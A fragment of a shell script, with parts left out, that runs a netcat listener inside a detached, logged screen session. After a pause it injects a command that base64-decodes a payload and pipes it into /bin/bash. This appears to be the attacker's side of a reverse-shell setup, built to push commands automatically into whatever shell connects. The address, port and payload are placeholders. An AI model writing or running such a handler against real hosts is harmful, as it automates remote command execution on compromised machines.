...
while true; do
    ...
    screen -d -L -Logfile /tmp/netcat.log -S netcat -m nc -vv -nl listen_ip listen_port
    ...
    sleep 30
    log 'sending screen command: payload';
    screen -S netcat -p 0 -X stuff "echo 'cGF5bG9hZA==' | base64 -d | /bin/bash -^M"
